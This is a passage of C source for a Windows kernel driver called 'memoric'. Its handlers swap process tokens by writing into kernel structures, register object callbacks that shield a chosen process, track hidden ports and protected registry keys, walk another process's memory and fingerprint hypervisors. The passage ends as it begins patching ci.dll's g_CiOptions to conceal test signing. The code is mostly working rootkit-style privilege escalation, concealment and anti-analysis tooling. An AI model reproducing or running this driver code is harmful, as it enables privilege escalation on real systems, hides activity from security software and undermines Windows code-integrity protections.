        /* Build new EX_FAST_REF: token pointer | max refcount (0xF on x64) */
        {
            ULONG_PTR newFastRef = (ULONG_PTR)sourceTokenObj | 0xF;
            *pTargetToken = newFastRef;
        }

        /* Release the original token — target process no longer holds it */
        ObDereferenceObject(originalTokenObj);

        DbgPrint("[memoric] TokenDup: PID %lu token replaced (0x%llX -> 0x%llX) from PID %lu [ref-counted]\n",
                 targetPid, (ULONG64)originalTokenObj, (ULONG64)sourceTokenObj, sourcePid);

        resp = (PMEMORIC_TOKEN_DUP_RESPONSE)SystemBuffer;
        resp->OriginalToken = (ULONG64)originalTokenObj;
        resp->NewToken = (ULONG64)sourceTokenObj;
        resp->TargetPid = targetPid;
        resp->SourcePid = sourcePid;
        *BytesReturned = sizeof(MEMORIC_TOKEN_DUP_RESPONSE);
        break;
    }
    case MEMORIC_TOKEN_RESTORE: {
        /*
         * Restore a previously saved original token for the target PID.
         * Reference-counted: reference the old token, swap back, deref current.
         */
        ULONG_PTR *pTargetToken = (ULONG_PTR*)((ULONG_PTR)targetProcess + g_Offsets.Token);
        ULONG_PTR currentFastRef = *pTargetToken;
        PVOID currentTokenObj = (PVOID)(currentFastRef & ~(ULONG_PTR)0xF);
        BOOLEAN restored = FALSE;
        ULONG si;

        for (si = 0; si < MAX_SAVED_TOKENS; si++) {
            if (g_SavedTokens[si].InUse && g_SavedTokens[si].TargetPid == targetPid) {
                PVOID origTokenObj = (PVOID)(g_SavedTokens[si].OriginalFastRef & ~(ULONG_PTR)0xF);

                ObReferenceObject(origTokenObj);
                *pTargetToken = g_SavedTokens[si].OriginalFastRef;
                ObDereferenceObject(currentTokenObj);

                g_SavedTokens[si].InUse = FALSE;
                restored = TRUE;

                if (OutputLength >= sizeof(MEMORIC_TOKEN_DUP_RESPONSE)) {
                    resp = (PMEMORIC_TOKEN_DUP_RESPONSE)SystemBuffer;
                    resp->OriginalToken = (ULONG64)currentTokenObj;
                    resp->NewToken = (ULONG64)origTokenObj;
                    resp->TargetPid = targetPid;
                    resp->SourcePid = sourcePid;
                    *BytesReturned = sizeof(MEMORIC_TOKEN_DUP_RESPONSE);
                }

                DbgPrint("[memoric] TokenDup: Restored PID %lu token (0x%llX -> 0x%llX) [ref-counted]\n",
                         targetPid, (ULONG64)currentTokenObj, (ULONG64)origTokenObj);
                break;
            }
        }

        if (!restored) {
            DbgPrint("[memoric] TokenDup: No saved token found for PID %lu\n", targetPid);
            ObDereferenceObject(sourceProcess);
            ObDereferenceObject(targetProcess);
            return STATUS_NOT_FOUND;
        }
        break;
    }
    default:
        ObDereferenceObject(sourceProcess);
        ObDereferenceObject(targetProcess);
        return STATUS_INVALID_PARAMETER;
    }

    ObDereferenceObject(sourceProcess);
    ObDereferenceObject(targetProcess);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Object Hook — OB_OPERATION_REGISTRATION for process/thread protection
 * ================================================================ */

static PVOID g_ObCallbackRegistration = NULL;
static ULONG g_ObjProtectPid = 0;
static ULONG g_ObjStripAccess = 0;
static volatile LONG g_ObjInterceptionCount = 0;

static OB_PREOP_CALLBACK_STATUS MemoricObjectPreCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInfo)
{
    UNREFERENCED_PARAMETER(RegistrationContext);

    if (OperationInfo->ObjectType == *PsProcessType) {
        PEPROCESS process = (PEPROCESS)OperationInfo->Object;
        HANDLE pid = PsGetProcessId(process);

        if ((ULONG)(ULONG_PTR)pid == g_ObjProtectPid) {
            /* Strip requested access bits */
            if (OperationInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
                OperationInfo->Parameters->CreateHandleInformation.DesiredAccess &= ~g_ObjStripAccess;
            } else if (OperationInfo->Operation == OB_OPERATION_HANDLE_DUPLICATE) {
                OperationInfo->Parameters->DuplicateHandleInformation.DesiredAccess &= ~g_ObjStripAccess;
            }
            InterlockedIncrement(&g_ObjInterceptionCount);
        }
    } else if (OperationInfo->ObjectType == *PsThreadType) {
        PEPROCESS ownerProcess = IoThreadToProcess((PETHREAD)OperationInfo->Object);
        HANDLE pid = PsGetProcessId(ownerProcess);

        if ((ULONG)(ULONG_PTR)pid == g_ObjProtectPid) {
            if (OperationInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
                OperationInfo->Parameters->CreateHandleInformation.DesiredAccess &= ~g_ObjStripAccess;
            } else if (OperationInfo->Operation == OB_OPERATION_HANDLE_DUPLICATE) {
                OperationInfo->Parameters->DuplicateHandleInformation.DesiredAccess &= ~g_ObjStripAccess;
            }
            InterlockedIncrement(&g_ObjInterceptionCount);
        }
    }

    return OB_PREOP_SUCCESS;
}

static NTSTATUS HandleObjectHook(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_OBJECT_HOOK_REQUEST req;

    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_OBJECT_HOOK_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_OBJECT_HOOK_REQUEST)SystemBuffer;

    switch (req->Action) {
    case MEMORIC_OBJ_HOOK_REGISTER: {
        OB_OPERATION_REGISTRATION opReg[2];
        OB_CALLBACK_REGISTRATION callbackReg;
        UNICODE_STRING altitude;
        NTSTATUS status;

        if (g_ObCallbackRegistration) {
            /* Already registered — unregister first */
            ObUnRegisterCallbacks(g_ObCallbackRegistration);
            g_ObCallbackRegistration = NULL;
        }

        g_ObjProtectPid = req->ProtectPid;
        g_ObjStripAccess = req->StripAccess;
        g_ObjInterceptionCount = 0;

        RtlZeroMemory(opReg, sizeof(opReg));

        /* Process callback */
        opReg[0].ObjectType = PsProcessType;
        opReg[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
        opReg[0].PreOperation = MemoricObjectPreCallback;
        opReg[0].PostOperation = NULL;

        /* Thread callback */
        opReg[1].ObjectType = PsThreadType;
        opReg[1].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
        opReg[1].PreOperation = MemoricObjectPreCallback;
        opReg[1].PostOperation = NULL;

        RtlInitUnicodeString(&altitude, L"321000");

        RtlZeroMemory(&callbackReg, sizeof(callbackReg));
        callbackReg.Version = OB_FLT_REGISTRATION_VERSION;
        callbackReg.OperationRegistrationCount = 2;
        callbackReg.RegistrationContext = NULL;
        callbackReg.Altitude = altitude;
        callbackReg.OperationRegistration = opReg;

        status = ObRegisterCallbacks(&callbackReg, &g_ObCallbackRegistration);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[memoric] ObRegisterCallbacks failed: 0x%08X\n", status);
            g_ObCallbackRegistration = NULL;
            return status;
        }

        DbgPrint("[memoric] Object hook registered: protect PID=%lu, strip=0x%08X\n",
                 g_ObjProtectPid, g_ObjStripAccess);
        break;
    }
    case MEMORIC_OBJ_HOOK_UNREGISTER: {
        if (g_ObCallbackRegistration) {
            ObUnRegisterCallbacks(g_ObCallbackRegistration);
            g_ObCallbackRegistration = NULL;
            g_ObjProtectPid = 0;
            g_ObjStripAccess = 0;
            DbgPrint("[memoric] Object hook unregistered\n");
        }
        break;
    }
    case MEMORIC_OBJ_HOOK_QUERY: {
        PMEMORIC_OBJECT_HOOK_RESPONSE resp;
        if (OutputLength < sizeof(MEMORIC_OBJECT_HOOK_RESPONSE))
            return STATUS_BUFFER_TOO_SMALL;

        resp = (PMEMORIC_OBJECT_HOOK_RESPONSE)SystemBuffer;
        resp->Registered = g_ObCallbackRegistration ? 1 : 0;
        resp->InterceptionCount = (ULONG)g_ObjInterceptionCount;
        resp->ProtectedPid = g_ObjProtectPid;
        resp->StrippedAccess = g_ObjStripAccess;
        *BytesReturned = sizeof(MEMORIC_OBJECT_HOOK_RESPONSE);
        break;
    }
    default:
        return STATUS_INVALID_PARAMETER;
    }

    return STATUS_SUCCESS;
}

/* ── HandleDriverStats ─ IOCTL 0x81B ──────────────────────────────── */
static NTSTATUS HandleDriverStats(
    PVOID   SystemBuffer,
    ULONG   InputLength,
    ULONG   OutputLength,
    PULONG  BytesReturned)
{
    PMEMORIC_DRIVER_STATS resp;

    UNREFERENCED_PARAMETER(InputLength);

    if (OutputLength < sizeof(MEMORIC_DRIVER_STATS))
        return STATUS_BUFFER_TOO_SMALL;

    resp = (PMEMORIC_DRIVER_STATS)SystemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_DRIVER_STATS));

    resp->TotalIoctls       = (ULONG)g_IoctlTotal;
    resp->SuccessIoctls     = (ULONG)g_IoctlSuccess;
    resp->FailedIoctls      = (ULONG)g_IoctlFailed;
    resp->ExceptionCount    = (ULONG)g_IoctlException;
    resp->OpenHandles       = (ULONG)g_OpenHandles;
    resp->BuildNumber       = g_Offsets.BuildNumber;
    resp->DriverVersion     = MEMORIC_DRIVER_VERSION;
    resp->OffsetsResolved   = g_Offsets.Resolved ? 1 : 0;
    resp->NotifyProcessActive = g_NotifyProcessRegistered ? 1 : 0;
    resp->NotifyThreadActive  = g_NotifyThreadRegistered ? 1 : 0;
    resp->NotifyImageActive   = g_NotifyImageRegistered ? 1 : 0;
    resp->RegCallbackActive   = g_RegCallbackRegistered ? 1 : 0;
    resp->ObCallbackActive    = g_ObCallbackRegistration ? 1 : 0;

    /* Count active DPC timers */
    {
        ULONG i, dpcCount = 0;
        for (i = 0; i < MAX_DPC_TIMERS; i++) {
            if (g_DpcTimers[i].Active)
                dpcCount++;
        }
        resp->DpcTimersActive = dpcCount;
    }

    /* Count active hidden ports */
    resp->HiddenPortCount = (ULONG)g_HiddenPortCount;

    /* Count protected registry keys */
    {
        ULONG i, keyCount = 0;
        for (i = 0; i < MAX_REG_PROTECTED_KEYS; i++) {
            if (g_RegProtectedKeys[i].InUse)
                keyCount++;
        }
        resp->ProtectedKeyCount = keyCount;
    }

    *BytesReturned = sizeof(MEMORIC_DRIVER_STATS);
    return STATUS_SUCCESS;
}

/* ── HandleCapabilities ─ driver ABI/capability handshake ─────────── */
static NTSTATUS HandleCapabilities(
    PVOID   SystemBuffer,
    ULONG   InputLength,
    ULONG   OutputLength,
    PULONG  BytesReturned)
{
    PMEMORIC_CAPABILITIES_RESPONSE resp;

    UNREFERENCED_PARAMETER(InputLength);

    if (OutputLength < sizeof(MEMORIC_CAPABILITIES_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    resp = (PMEMORIC_CAPABILITIES_RESPONSE)SystemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_CAPABILITIES_RESPONSE));

    resp->Size = sizeof(MEMORIC_CAPABILITIES_RESPONSE);
    resp->AbiVersion = MEMORIC_ABI_VERSION;
    resp->DriverVersion = MEMORIC_DRIVER_VERSION;
    resp->BuildNumber = g_Offsets.BuildNumber;
    resp->MaxIoSize = MEMORIC_MAX_IO_SIZE;
    resp->MaxForceWrite = MEMORIC_MAX_FORCE_WRITE;
    resp->OffsetsResolved = g_Offsets.Resolved ? 1 : 0;
    resp->CapabilityFlags = MEMORIC_CAPABILITY_FLAGS;
    resp->CapabilityFlags2 = 0;

    *BytesReturned = sizeof(MEMORIC_CAPABILITIES_RESPONSE);
    return STATUS_SUCCESS;
}

/* ── HandleMemoryPool ─ IOCTL 0x81C ─────────────────────────────── */
static NTSTATUS HandleMemoryPool(
    PVOID   SystemBuffer,
    ULONG   InputLength,
    ULONG   OutputLength,
    PULONG  BytesReturned)
{
    MEMORIC_POOL_QUERY_REQUEST reqCopy;
    PMEMORIC_POOL_QUERY_RESPONSE resp;
    ULONG maxEntries;
    ULONG count = 0;
    ULONG headerSize;
    NTSTATUS status;
    PVOID enumHandle = NULL;
    ULONG retLen = 0;
    PVOID sysInfo = NULL;

    if (InputLength < sizeof(MEMORIC_POOL_QUERY_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, SystemBuffer, sizeof(MEMORIC_POOL_QUERY_REQUEST));
    maxEntries = reqCopy.MaxEntries > 0 ? reqCopy.MaxEntries : 256;

    headerSize = FIELD_OFFSET(MEMORIC_POOL_QUERY_RESPONSE, Entries);
    if (OutputLength < headerSize + sizeof(MEMORIC_POOL_ENTRY))
        return STATUS_BUFFER_TOO_SMALL;

    {
        ULONG maxByBuffer = (OutputLength - headerSize) / sizeof(MEMORIC_POOL_ENTRY);
        if (maxEntries > maxByBuffer)
            maxEntries = maxByBuffer;
    }

    resp = (PMEMORIC_POOL_QUERY_RESPONSE)SystemBuffer;
    RtlZeroMemory(resp, headerSize);

    /*
     * Use SystemPoolTagInformation (class 22) to enumerate pool tags.
     * First call with 0 to get required size.
     */
    retLen = 4096;
    do {
        if (sysInfo)
            ExFreePoolWithTag(sysInfo, MEMORIC_POOL_TAG);
        sysInfo = ExAllocatePoolWithTag(NonPagedPool, retLen, MEMORIC_POOL_TAG);
        if (!sysInfo)
            return STATUS_INSUFFICIENT_RESOURCES;

        status = ZwQuerySystemInformation(
            22, /* SystemPoolTagInformation */
            sysInfo, retLen, &retLen);
    } while (status == STATUS_INFO_LENGTH_MISMATCH && retLen < 16 * 1024 * 1024);

    if (NT_SUCCESS(status)) {
        /*
         * SYSTEM_POOLTAG_INFORMATION:
         *   ULONG Count;
         *   SYSTEM_POOLTAG TagInfo[1];
         *
         * SYSTEM_POOLTAG:
         *   UCHAR Tag[4];
         *   ULONG PagedAllocs;  ULONG PagedFrees;  SIZE_T PagedUsed;
         *   ULONG NonPagedAllocs; ULONG NonPagedFrees; SIZE_T NonPagedUsed;
         */
        PULONG pCount = (PULONG)sysInfo;
        ULONG tagCount = *pCount;
        PUCHAR tagArray = (PUCHAR)sysInfo + sizeof(ULONG);
        ULONG totalMatch = 0;
        ULONG i;

        /* Each SYSTEM_POOLTAG is 4 + padding + 6 SIZE_T-or-ULONG fields.
         * On x64: Tag(4) + pad(4) + 6*8 = 56 bytes total per entry.
         * Simpler: use sizeof approach. sizeof = 40 on x64 due to SIZE_T.
         *
         * Actual layout on x64:
         * UCHAR Tag[4]; ULONG PagedAllocs; ULONG PagedFrees; SIZE_T PagedUsed;
         * ULONG NonPagedAllocs; ULONG NonPagedFrees; SIZE_T NonPagedUsed;
         * = 4 + 4 + 4 + pad(4) + 8 + 4 + 4 + 8 = 40 bytes
         */
        #define POOLTAG_ENTRY_SIZE 40

        for (i = 0; i < tagCount && count < maxEntries; i++) {
            PUCHAR tagEntry = tagArray + (SIZE_T)i * POOLTAG_ENTRY_SIZE;
            ULONG tag;

            __try {
                tag = *(PULONG)tagEntry;
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                break;
            }

            if (reqCopy.PoolTag != 0 && tag != reqCopy.PoolTag) {
                continue;
            }

            totalMatch++;

            if (count < maxEntries) {
                PMEMORIC_POOL_ENTRY e = &resp->Entries[count];
                ULONG pagedAllocs, nonPagedAllocs;
                SIZE_T pagedUsed, nonPagedUsed;

                __try {
                    pagedAllocs = *(PULONG)(tagEntry + 4);
                    nonPagedAllocs = *(PULONG)(tagEntry + 16);
                    pagedUsed = *(PSIZE_T)(tagEntry + 16);
                    nonPagedUsed = *(PSIZE_T)(tagEntry + 32);
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    break;
                }

                e->PoolTag = tag;
                e->Address = 0; /* Not available from tag info */
                e->Size = pagedUsed + nonPagedUsed;
                e->PoolType = (nonPagedAllocs > 0) ? 0 : 1; /* Guess dominant pool type */
                count++;
            }
        }

        resp->EntryCount = count;
        resp->TotalAllocations = totalMatch;
    }

    if (sysInfo)
        ExFreePoolWithTag(sysInfo, MEMORIC_POOL_TAG);

    *BytesReturned = headerSize + count * sizeof(MEMORIC_POOL_ENTRY);
    DbgPrint("[memoric] MemoryPool: tag=0x%08X, returned %lu entries\n",
             reqCopy.PoolTag, count);
    return STATUS_SUCCESS;
}

/* ── HandleMinifilterEnum ─ IOCTL 0x81D ──────────────────────────── */
static NTSTATUS HandleMinifilterEnum(
    PVOID   SystemBuffer,
    ULONG   InputLength,
    ULONG   OutputLength,
    PULONG  BytesReturned)
{
    PMEMORIC_MINIFILTER_RESPONSE resp;
    ULONG headerSize;
    ULONG maxEntries;
    ULONG count = 0;
    NTSTATUS status;

    UNREFERENCED_PARAMETER(InputLength);

    headerSize = FIELD_OFFSET(MEMORIC_MINIFILTER_RESPONSE, Entries);
    if (OutputLength < headerSize + sizeof(MEMORIC_MINIFILTER_ENTRY))
        return STATUS_BUFFER_TOO_SMALL;

    maxEntries = (OutputLength - headerSize) / sizeof(MEMORIC_MINIFILTER_ENTRY);
    if (maxEntries > 256)
        maxEntries = 256;

    resp = (PMEMORIC_MINIFILTER_RESPONSE)SystemBuffer;
    RtlZeroMemory(resp, headerSize);

    /*
     * Try FltEnumerateFilters (dynamic import from fltmgr.sys) first.
     * This gives accurate minifilter information including altitude,
     * instance count, and frame ID.
     *
     * Fallback: heuristic module enumeration via SystemModuleInformation.
     *
     * Reference: Windows Filter Manager documentation, FltEnumerateFilters
     * Also see: FltEnumerateFilterInformation for detailed per-filter info
     */

    /* Dynamically import FltMgr functions */
    typedef NTSTATUS (NTAPI *PFN_FltEnumerateFilters)(
        PVOID *FilterList, ULONG FilterListSize, PULONG NumberFiltersReturned);
    typedef NTSTATUS (NTAPI *PFN_FltGetFilterInformation)(
        PVOID Filter, ULONG InformationClass, PVOID Buffer,
        ULONG BufferSize, PULONG BytesReturned);
    typedef VOID (NTAPI *PFN_FltObjectDereference)(PVOID FltObject);

    /* FilterFullInformation structure (from fltKernel.h, class=0) */
    typedef struct _FILTER_FULL_INFO {
        ULONG  NextEntryOffset;
        ULONG  FrameID;
        ULONG  NumberOfInstances;
        USHORT FilterNameLength;
        WCHAR  FilterNameBuffer[1];
    } FILTER_FULL_INFO;

    UNICODE_STRING fltEnumName, fltInfoName, fltDerefName;
    RtlInitUnicodeString(&fltEnumName, L"FltEnumerateFilters");
    RtlInitUnicodeString(&fltInfoName, L"FltGetFilterInformation");
    RtlInitUnicodeString(&fltDerefName, L"FltObjectDereference");

    PFN_FltEnumerateFilters pFltEnumFilters =
        (PFN_FltEnumerateFilters)MmGetSystemRoutineAddress(&fltEnumName);
    PFN_FltGetFilterInformation pFltGetInfo =
        (PFN_FltGetFilterInformation)MmGetSystemRoutineAddress(&fltInfoName);
    PFN_FltObjectDereference pFltDeref =
        (PFN_FltObjectDereference)MmGetSystemRoutineAddress(&fltDerefName);

    if (pFltEnumFilters && pFltDeref) {
        /* FltMgr functions available — use real enumeration */
        PVOID *filterList = NULL;
        ULONG numFilters = 0;

        /* First call: get count */
        status = pFltEnumFilters(NULL, 0, &numFilters);
        if (numFilters > 0) {
            filterList = (PVOID *)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                numFilters * sizeof(PVOID), MEMORIC_POOL_TAG);
            if (filterList) {
                ULONG actualCount = 0;
                status = pFltEnumFilters(filterList, numFilters, &actualCount);
                if (NT_SUCCESS(status)) {
                    ULONG fi;
                    UCHAR infoBuf[512];
                    for (fi = 0; fi < actualCount && count < maxEntries; fi++) {
                        if (pFltGetInfo) {
                            ULONG retBytes = 0;
                            /* FilterFullInformation = class 0 */
                            status = pFltGetInfo(filterList[fi], 0, infoBuf,
                                                 sizeof(infoBuf), &retBytes);
                            if (NT_SUCCESS(status) && retBytes >= sizeof(FILTER_FULL_INFO)) {
                                FILTER_FULL_INFO *info = (FILTER_FULL_INFO *)infoBuf;
                                PMEMORIC_MINIFILTER_ENTRY e = &resp->Entries[count];

                                ULONG copyLen = info->FilterNameLength;
                                if (copyLen > sizeof(e->FilterName) - sizeof(WCHAR))
                                    copyLen = sizeof(e->FilterName) - sizeof(WCHAR);
                                RtlCopyMemory(e->FilterName, info->FilterNameBuffer, copyLen);
                                e->FilterName[copyLen / sizeof(WCHAR)] = L'\0';
                                e->FrameId = info->FrameID;
                                e->NumberOfInstances = info->NumberOfInstances;
                                e->Flags = 0;
                                count++;
                            }
                        }
                        pFltDeref(filterList[fi]);
                    }
                    /* Deref any remaining filters we didn't process */
                    for (; fi < actualCount; fi++)
                        pFltDeref(filterList[fi]);
                }
                ExFreePoolWithTag(filterList, MEMORIC_POOL_TAG);
            }
        }

        resp->FilterCount = count;
        *BytesReturned = headerSize + count * sizeof(MEMORIC_MINIFILTER_ENTRY);
        DbgPrint("[memoric] MinifilterEnum (FltMgr): found %lu filters\n", count);
        return STATUS_SUCCESS;
    }

    /* FltMgr not loaded — return empty result rather than unreliable heuristic */
    DbgPrint("[memoric] MinifilterEnum: FltMgr not available, no filters to enumerate\n");
    resp->FilterCount = 0;
    *BytesReturned = headerSize;
    return STATUS_SUCCESS;
}

/* ── HandleProcessDump ─ IOCTL 0x81E ─────────────────────────────── */
static NTSTATUS HandleProcessDump(
    PVOID   SystemBuffer,
    ULONG   InputLength,
    ULONG   OutputLength,
    PULONG  BytesReturned)
{
    MEMORIC_PROCESS_DUMP_REQUEST reqCopy;
    PMEMORIC_PROCESS_DUMP_RESPONSE resp;
    ULONG headerSize;
    ULONG maxRegions;
    ULONG count = 0, totalRegions = 0;
    ULONG64 totalSize = 0;
    PEPROCESS targetProcess = NULL;
    KAPC_STATE apcState;
    NTSTATUS status;
    ULONG64 addr;
    BOOLEAN attached = FALSE;

    if (InputLength < sizeof(MEMORIC_PROCESS_DUMP_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, SystemBuffer, sizeof(MEMORIC_PROCESS_DUMP_REQUEST));

    headerSize = FIELD_OFFSET(MEMORIC_PROCESS_DUMP_RESPONSE, Regions);
    if (OutputLength < headerSize + sizeof(MEMORIC_REGION_ENTRY))
        return STATUS_BUFFER_TOO_SMALL;

    maxRegions = (OutputLength - headerSize) / sizeof(MEMORIC_REGION_ENTRY);
    if (maxRegions > 4096)
        maxRegions = 4096;

    resp = (PMEMORIC_PROCESS_DUMP_RESPONSE)SystemBuffer;
    RtlZeroMemory(resp, headerSize);

    /* Lookup target process */
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &targetProcess);
    if (!NT_SUCCESS(status))
        return status;

    /* Attach to target process address space */
    KeStackAttachProcess(targetProcess, &apcState);
    attached = TRUE;

    addr = reqCopy.BaseAddress;
    if (addr == 0)
        addr = 0x10000; /* Skip first 64KB (null page guard) */

    __try {
        while (addr < 0x7FFFFFFFFFFF) { /* User-mode address space limit */
            MEMORY_BASIC_INFORMATION mbi;
            SIZE_T retLength;

            status = ZwQueryVirtualMemory(
                ZwCurrentProcess(),
                (PVOID)addr,
                MemoryBasicInformation,
                &mbi, sizeof(mbi), &retLength);

            if (!NT_SUCCESS(status))
                break;

            if (mbi.RegionSize == 0)
                break;

            /* Apply filters */
            {
                BOOLEAN include = TRUE;

                if (reqCopy.Flags == 1 && !(mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)))
                    include = FALSE;
                if (reqCopy.Flags == 2 && mbi.State != MEM_COMMIT)
                    include = FALSE;

                if (include) {
                    totalRegions++;
                    totalSize += mbi.RegionSize;

                    if (count < maxRegions) {
                        PMEMORIC_REGION_ENTRY e = &resp->Regions[count];
                        e->BaseAddress = (ULONG64)mbi.BaseAddress;
                        e->RegionSize = (ULONG64)mbi.RegionSize;
                        e->State = mbi.State;
                        e->Protect = mbi.Protect;
                        e->Type = mbi.Type;
                        count++;
                    }
                }
            }

            addr = (ULONG64)mbi.BaseAddress + mbi.RegionSize;

            /* Respect max size limit */
            if (reqCopy.MaxSize > 0 && totalSize >= reqCopy.MaxSize)
                break;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[memoric] ProcessDump: exception walking memory at 0x%llx\n", addr);
    }

    if (attached) {
        KeUnstackDetachProcess(&apcState);
    }
    ObDereferenceObject(targetProcess);

    resp->RegionCount = count;
    resp->TotalRegions = totalRegions;
    resp->TotalSize = totalSize;

    *BytesReturned = headerSize + count * sizeof(MEMORIC_REGION_ENTRY);
    DbgPrint("[memoric] ProcessDump: pid=%lu, %lu regions, %llu bytes total\n",
             reqCopy.ProcessId, count, totalSize);
    return STATUS_SUCCESS;
}

/* ── HandleHypervisorDetect ─ IOCTL 0x81F ────────────────────────── */
static NTSTATUS HandleHypervisorDetect(
    PVOID   SystemBuffer,
    ULONG   InputLength,
    ULONG   OutputLength,
    PULONG  BytesReturned)
{
    PMEMORIC_HYPERVISOR_DETECT_RESPONSE resp;
    int cpuInfo[4] = {0};
    ULONG64 tsc1, tsc2, delta;
    KIRQL oldIrql;

    UNREFERENCED_PARAMETER(InputLength);

    if (OutputLength < sizeof(MEMORIC_HYPERVISOR_DETECT_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    resp = (PMEMORIC_HYPERVISOR_DETECT_RESPONSE)SystemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_HYPERVISOR_DETECT_RESPONSE));

    /* ── CPUID leaf 1: check hypervisor present bit (ECX bit 31) ── */
    __cpuid(cpuInfo, 1);
    resp->HypervisorPresent = (cpuInfo[2] & (1 << 31)) ? 1 : 0;

    if (resp->HypervisorPresent) {
        /* ── CPUID leaf 0x40000000: hypervisor vendor string ── */
        __cpuid(cpuInfo, 0x40000000);
        resp->CpuidLeafCount = cpuInfo[0] - 0x40000000;

        /* Vendor string is in EBX, ECX, EDX */
        RtlCopyMemory(resp->VendorId + 0, &cpuInfo[1], 4);
        RtlCopyMemory(resp->VendorId + 4, &cpuInfo[2], 4);
        RtlCopyMemory(resp->VendorId + 8, &cpuInfo[3], 4);
        resp->VendorId[12] = '\0';

        /* Identify hypervisor type from vendor string */
        if (RtlCompareMemory(resp->VendorId, "Microsoft Hv", 12) == 12)
            resp->HypervisorType = 1; /* Hyper-V */
        else if (RtlCompareMemory(resp->VendorId, "VMwareVMware", 12) == 12)
            resp->HypervisorType = 2; /* VMware */
        else if (RtlCompareMemory(resp->VendorId, "VBoxVBoxVBox", 12) == 12)
            resp->HypervisorType = 3; /* VirtualBox */
        else if (RtlCompareMemory(resp->VendorId, "KVMKVMKVM\0\0\0", 12) == 12)
            resp->HypervisorType = 4; /* KVM */
        else if (RtlCompareMemory(resp->VendorId, "TCGTCGTCGTCG", 12) == 12)
            resp->HypervisorType = 5; /* QEMU */
        else if (RtlCompareMemory(resp->VendorId, "XenVMMXenVMM", 12) == 12)
            resp->HypervisorType = 6; /* Xen */
        else
            resp->HypervisorType = 7; /* Unknown */
    }

    /* ── RDTSC timing anomaly detection ── */
    /* Raise IRQL to prevent scheduling during measurement */
    oldIrql = KeRaiseIrqlToDpcLevel();

    tsc1 = __rdtsc();
    __cpuid(cpuInfo, 0); /* Serializing instruction */
    tsc2 = __rdtsc();
    delta = tsc2 - tsc1;

    KeLowerIrql(oldIrql);

    /* Bare metal CPUID typically takes 100-300 cycles.
     * Under hypervisor it can take 1000-10000+ cycles due to VM exit. */
    if (delta > 1000)
        resp->TimingAnomaly = 1;

    /* ── IDT base anomaly detection ── */
    {
        IDTR idtr;
        __sidt(&idtr);

        /* On bare metal, IDT base is typically in the range
         * 0xFFFFF800`00000000 - 0xFFFFF880`00000000.
         * Hypervisors sometimes relocate it. */
        if (idtr.Base < 0xFFFFF78000000000ULL || idtr.Base > 0xFFFFF90000000000ULL)
            resp->IdtAnomaly = 1;
    }

    /* ── MSR anomaly detection ── */
    __try {
        ULONG64 msr;

        /* Read MSR_LSTAR (0xC0000082) - syscall handler address */
        msr = __readmsr(0xC0000082);

        /* Some hypervisors hook LSTAR to intercept syscalls */
        if (msr < 0xFFFFF78000000000ULL || msr > 0xFFFFF90000000000ULL)
            resp->MsrAnomaly = 1;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        /* MSR access exception is itself an anomaly */
        resp->MsrAnomaly = 1;
    }

    resp->NestingLevel = resp->HypervisorPresent ? 1 : 0;

    *BytesReturned = sizeof(MEMORIC_HYPERVISOR_DETECT_RESPONSE);
    DbgPrint("[memoric] HypervisorDetect: present=%lu, type=%lu, vendor=%s, timing=%lu, idt=%lu, msr=%lu\n",
             resp->HypervisorPresent, resp->HypervisorType, resp->VendorId,
             resp->TimingAnomaly, resp->IdtAnomaly, resp->MsrAnomaly);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Test Signing Concealment (Kernel-Level)
 *
 * Patches SharedUserData and/or ci.dll g_CiOptions to hide test
 * signing indicators that are visible from usermode.
 * ================================================================ */

/* Global state for test signing bypass */
static ULONG g_OriginalCiOptions = 0;
static ULONG g_TestSignPatched = 0;
static ULONG64 g_CiOptionsAddr = 0;

static NTSTATUS HandleTestSignHide(
    PVOID SystemBuffer,
    ULONG InputBufferLength,
    ULONG OutputBufferLength,
    PULONG BytesReturned)
{
    PMEMORIC_TESTSIGN_REQUEST req;
    PMEMORIC_TESTSIGN_RESPONSE resp;

    if (InputBufferLength < sizeof(MEMORIC_TESTSIGN_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (OutputBufferLength < sizeof(MEMORIC_TESTSIGN_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_TESTSIGN_REQUEST)SystemBuffer;
    resp = (PMEMORIC_TESTSIGN_RESPONSE)SystemBuffer;

    RtlZeroMemory(resp, sizeof(MEMORIC_TESTSIGN_RESPONSE));
    resp->Action = req->Action;
    resp->SharedUserAddress = 0x7FFE0000ULL;

    switch (req->Action) {
    case MEMORIC_TESTSIGN_QUERY:
    {
        /* Read KUSER_SHARED_DATA (mapped at 0xFFFFF78000000000 in kernel) */
        PUCHAR sharedUser = (PUCHAR)0xFFFFF78000000000ULL;
        /* TestRetInstruction at offset 0x2F0 in some builds, but the reliable
           indicator is NtGlobalFlag and the CodeIntegrity indicator.
           We check via SharedData.Kd... fields and CI module. */

